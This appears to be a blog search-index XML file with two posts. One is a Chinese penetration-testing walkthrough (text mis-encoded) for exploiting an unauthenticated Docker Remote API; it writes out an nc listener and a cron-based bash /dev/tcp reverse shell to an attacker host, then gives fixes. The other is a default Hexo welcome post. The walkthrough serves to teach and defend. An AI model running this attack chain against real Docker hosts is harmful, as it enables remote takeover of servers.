<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Docker Remote API æœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨</title>
    <link href="/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="æ¼æ´ç®€ä»‹åŠå±å®³"><a href="#æ¼æ´ç®€ä»‹åŠå±å®³" class="headerlink" title="æ¼æ´ç®€ä»‹åŠå±å®³"></a>æ¼æ´ç®€ä»‹åŠå±å®³</h4><p>Dockeræ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œè®©å¼€å‘è€…å¯ä»¥æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„LINUXæœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚ Docker swarm æ˜¯ä¸€ä¸ªå°†dockeré›†ç¾¤å˜æˆå•ä¸€è™šæ‹Ÿçš„docker hostå·¥å…·ï¼Œä½¿ç”¨æ ‡å‡†çš„Docker APIï¼Œèƒ½å¤Ÿæ–¹ä¾¿dockeré›†ç¾¤çš„ç®¡ç†å’Œæ‰©å±•ï¼Œç”±dockerå®˜æ–¹æä¾›ã€‚</p><p>Docker Remote API æ˜¯ä¸€ä¸ªå–ä»£è¿œç¨‹å‘½ä»¤è¡Œç•Œé¢ï¼ˆrcliï¼‰çš„REST APIã€‚Docker Remote APIå¦‚é…ç½®ä¸å½“å¯å¯¼è‡´æœªæˆæƒè®¿é—®ï¼Œæ”»å‡»è€…åˆ©ç”¨ docker client æˆ–è€… http ç›´æ¥è¯·æ±‚å°±å¯ä»¥è®¿é—®è¿™ä¸ª APIï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œé»‘å®¢ä¹Ÿå¯ä»¥åˆ é™¤Dockerä¸Šçš„æ•°æ®ã€‚ æ”»å‡»è€…å¯è¿›ä¸€æ­¥åˆ©ç”¨Dockerè‡ªèº«ç‰¹æ€§ï¼Œç›´æ¥è®¿é—®å®¿ä¸»æœºä¸Šçš„æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–å¯¹æ•æ„Ÿæ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œæœ€ç»ˆå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><h5 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h5><pre><code class="hljs plain"># é¶æœºIP&#x2F;ç«¯å£172.19.101.34 2375# æ“ä½œç³»ç»Ÿlinux_x86</code></pre><h5 id="æœªæˆæƒè®¿é—®æµ‹è¯•"><a href="#æœªæˆæƒè®¿é—®æµ‹è¯•" class="headerlink" title="æœªæˆæƒè®¿é—®æµ‹è¯•"></a>æœªæˆæƒè®¿é—®æµ‹è¯•</h5><pre><code class="hljs plain">docker tcp:&#x2F;&#x2F;172.19.101.34:2375 --version# è¿”å›ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ¼æ´å­˜åœ¨Docker version 19.03.5, build 633a0ea</code></pre><h5 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h5><pre><code class="hljs plain"># åœ¨æ”»å‡»ä¸»æœºä¸Šæ‰“å¼€8088ç«¯å£ç›‘å¬[root@]# nc -vv -l -p 8088</code></pre><h5 id="å†™å…¥shell"><a href="#å†™å…¥shell" class="headerlink" title="å†™å…¥shell"></a>å†™å…¥shell</h5><p>åˆ›å»ºå®¹å™¨ï¼Œåˆ©ç”¨bashå’Œcrontabè®¡åˆ’ä»»åŠ¡å‘å®¿ä¸»æœºå†™å…¥shellï¼Œcentosç³»ç»ŸæŒ‚è½½è·¯å¾„ä¸ºã€‚ /var/spool/cron/rootï¼›ubuntuç³»ç»Ÿä¸º/var/spool/cron/crontabs/rootï¼›</p><pre><code class="hljs plain"># æŸ¥çœ‹å®¿ä¸»æœºå¯ç”¨é•œåƒdocker tcp:&#x2F;&#x2F;172.19.101.34:2375 image# é€‰æ‹©åˆé€‚é•œåƒåˆ›å»ºå®¹å™¨docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; image_id &#x2F;bin&#x2F;bash# å¯åŠ¨åˆšåˆšåˆ›å»ºçš„å®¹å™¨å¹¶è¿æ¥docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 start ct_iddocker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash# æ‰§è¡Œshellåå¼¹å‘½ä»¤root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8088 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</code></pre><h5 id="æˆåŠŸåå¼¹å®¿ä¸»æœºshell"><a href="#æˆåŠŸåå¼¹å®¿ä¸»æœºshell" class="headerlink" title="æˆåŠŸåå¼¹å®¿ä¸»æœºshell"></a>æˆåŠŸåå¼¹å®¿ä¸»æœºshell</h5><p><img src="/img/docker_res.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ï¼Œæµ‹è¯•å®Œè®°å¾—åˆ æ‰å­˜åœ¨æ¼æ´çš„å®¹å™¨</p></blockquote><h4 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><p>ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼š</p><p>1ã€å¯¹2375ç«¯å£åšç½‘ç»œè®¿é—®æ§åˆ¶ï¼Œå¦‚è®¾ç½®iptablesç­–ç•¥ä»…å…è®¸æŒ‡å®šçš„IPæ¥è®¿é—®Dockeræ¥å£ï¼›</p><p>2ã€ä¿®æ”¹docker swarmçš„è®¤è¯æ–¹å¼ï¼Œä½¿ç”¨TLSè®¤è¯ï¼šOverview Swarm with TLS å’Œ Configure Docker Swarm for TLSè¿™ä¸¤ç¯‡æ–‡æ¡£ï¼Œè¯´çš„æ˜¯é…ç½®å¥½TLSåï¼ŒDocker CLI åœ¨å‘é€å‘½ä»¤åˆ°docker daemonä¹‹å‰ï¼Œä¼šé¦–å…ˆå‘é€å®ƒçš„è¯ä¹¦ï¼Œå¦‚æœè¯ä¹¦æ˜¯ç”±daemonä¿¡ä»»çš„CAæ‰€ç­¾åçš„ï¼Œæ‰å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚</p><p><strong>æ€»ä¹‹ã€ä¸è¦å°†ç«¯å£ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ï¼Œå†…ç½‘ä¸­ä½¿ç”¨éœ€è¦è®¾ç½®ä¸¥æ ¼çš„è®¿é—®è§„åˆ™ï¼Œå¹¶ä½¿ç”¨TLSã€‚</strong></p><p><a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">ğŸ”—çŸ¥ä¹é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/05/22/hello-world/"/>
    <url>/2020/05/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
